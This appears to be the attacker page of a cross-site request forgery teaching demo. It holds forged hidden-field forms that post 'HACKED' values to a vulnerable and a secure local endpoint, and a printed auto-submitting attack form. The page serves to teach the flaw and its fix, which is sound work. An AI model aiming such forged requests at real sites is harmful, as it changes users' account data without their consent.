<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attacker Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background: #333;
            color: white;
        }
        .danger {
            background: #dc3545;
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        button {
            background: #dc3545;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="danger">
        <h1>Malicious Website</h1>
        <p>This simulates an attacker's website that tries to change your settings without your permission.</p>
    </div>

    <h2>Attack Scenarios</h2>

    <h3>1. Manual Attack</h3>
    <p>Click the button to submit a forged request:</p>
    <form method="POST" action="csrf-vulnerable.php" target="_blank">
        <input type="hidden" name="name" value="HACKED">
        <input type="hidden" name="email" value="hacker@evil.com">
        <button type="submit">Launch Attack on Vulnerable Version</button>
    </form>
    <br>
    <form method="POST" action="csrf-secure.php" target="_blank">
        <input type="hidden" name="name" value="HACKED">
        <input type="hidden" name="email" value="hacker@evil.com">
        <button type="submit">Try Attack on Secure Version</button>
    </form>

    <h3>2. Automatic Attack (Invisible)</h3>
    <p>In a real attack, this form would submit automatically when you visit the page:</p>
    <pre style="background: #222; padding: 10px; border-radius: 4px;">
&lt;form id="attack" method="POST" action="csrf-vulnerable.php"&gt;
    &lt;input type="hidden" name="name" value="HACKED"&gt;
    &lt;input type="hidden" name="email" value="hacker@evil.com"&gt;
&lt;/form&gt;
&lt;script&gt;
    document.getElementById('attack').submit();
&lt;/script&gt;
    </pre>

    <p style="margin-top: 30px;">
        <strong>Why CSRF is dangerous:</strong> If you're logged into the vulnerable site
        and visit this page, your settings get changed without you clicking anything!
    </p>
</body>
</html>
